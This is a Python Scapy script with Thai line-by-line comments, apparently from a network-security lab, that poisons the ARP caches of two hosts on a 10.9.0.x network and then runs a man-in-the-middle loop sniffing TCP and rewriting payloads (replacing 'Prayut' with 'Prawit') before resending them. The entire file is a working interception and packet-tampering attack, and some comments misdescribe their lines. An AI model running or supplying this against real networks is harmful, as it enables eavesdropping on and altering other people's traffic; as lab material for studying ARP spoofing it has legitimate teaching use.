#!/usr/bin/env python3
from scapy.all import * #นำเข้าไลบารี่

#ประกาศสร้างฟั่งชั่นที่จะใช้วางยา 
def A (): 
        E = Ether()
        A = ARP()
        A.op = 1
        A.psrc = '10.9.0.6' #IP เตรื่อง A
        A.pdst = '10.9.0.5'
        E.dst = '02:42:0a:09:00:05'  #MAC เครื่อง A  
        pkt = E/A
        sendp(pkt)
        pkt.show() 
A() 

def B ():
    E = Ether()
    A = ARP()
    A.op = 1
    A.psrc = '10.9.0.5' #IP เตรื่อง B
    A.pdst = '10.9.0.6'
    E.dst = '02:42:0a:09:00:06'    #MAC เครื่อง B
    pkt = E/A
    sendp(pkt)
    pkt.show()

B()

#บรรทัดนี้พิมพ์ข้อความไปยังคอนโซลเพื่อระบุว่าการโจมตี MITM กำลังเริ่มขึ้น
print("LAUNCHING MITM ATTACK.........") 


def spoof_pkt(pkt): #ฟังก์ชันspoof_pktที่รับอาร์กิวเมนต์เดียวpktซึ่งแทนแพ็กเก็ตที่จับได้
   newpkt = IP(bytes(pkt[IP])) #บรรทัดนี้สร้างแพ็กเก็ต IP ใหม่โดยการคัดลอกเลเยอร์ IP ของแพ็กเก็ตที่ดักจับดั้งเดิมโดยใช้IP
   del(newpkt.chksum) #บรรทัดเหล่านี้ลบฟิลด์เช็คซัมออกจากส่วนหัวของ IP และ TCP Scapy จะคำนวณเช็คซัมใหม่โดยอัตโนมัติเมื่อส่งแพ็กเก็ตที่แก้ไข
   del(newpkt[TCP].payload) #บรรทัดนี้จะตรวจสอบว่าแพ็กเก็ต TCP ที่จับมีเพย์โหลด (ข้อมูล) หรือไม่ หากเป็นเช่นนั้น สคริปต์จะดำเนินการแก้ไขต่อไป
   del(newpkt[TCP].chksum) #บรรทัดเหล่านี้ลบฟิลด์เช็คซัมออกจากส่วนหัวของ IP และ TCP Scapy จะคำนวณเช็คซัมใหม่โดยอัตโนมัติเมื่อส่งแพ็กเก็ตที่แก้ไข

   if pkt[TCP].payload: #บรรทัดนี้จะตรวจสอบว่าแพ็กเก็ต TCP ที่จับมีเพย์โหลด (ข้อมูล) หรือไม่ หากเป็นเช่นนั้น สคริปต์จะดำเนินการแก้ไขต่อไป
       data = pkt[TCP].payload.load #บรรทัดนี้จะแยกข้อมูล payload จากแพ็กเก็ต TCP ที่จับ
       print("*** %s, length: %d" % (data, len(data))) #รรทัดนี้พิมพ์ข้อมูลเพย์โหลดและความยาวไปยังคอนโซล

       #บรรทัดนี้สร้างเพย์โหลดใหม่newdataโดยแทนที่เหตุการณ์ของลำดับไบต์b'Prayut'ด้วยb'Prawit'. กล่าวอีกนัยหนึ่ง จะแทนที่อินสแตนซ์ของสตริง "Prayut" ด้วย "Prawit" ในเพย์โหลด
       newdata = data.replace(b'Prayut', b'Prawit')
       #บรรทัดนี้ส่งแพ็คเก็ตที่แก้ไขแล้ว (พร้อมกับเพย์โหลดที่ถูกแทนที่) ไปยังเครือข่าย ใช้send()ฟังก์ชันของ Scapy เพื่อส่งแพ็คเก็ตใหม่
       send(newpkt/newdata)
   else:  #หากแพ็กเก็ต TCP ที่จับไม่มีเพย์โหลด หมายความว่าเป็นแพ็กเก็ต ACK ล้วนๆ สคริปต์จะดำเนินการบล็อกนี้
       send(newpkt) #บรรทัดนี้ส่งแพ็กเก็ตดั้งเดิมโดยไม่มีการแก้ไขใดๆ เนื่องจากไม่มีเพย์โหลดให้แก้ไข
#บรรทัดนี้ตั้งค่าของตัวแปรfเป็น'tcp'ซึ่งจะใช้เป็นตัวกรองเมื่อจับแพ็กเก็ต
f = 'tcp' 
#บรรทัดนี้จับแพ็กเก็ต TCP จากอินเทอร์เฟซเครือข่าย 'eth0' (คุณอาจต้องแทนที่ด้วยอินเทอร์เฟซที่เหมาะสมบนระบบของคุณ) ตามตัวกรองfและสำหรับแต่ละแพ็กเก็ตที่จับได้ จะเรียกฟังก์ชันspoof_pkt()เพื่อประมวลผลและอาจแก้ไขแพ็กเก็ต .
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
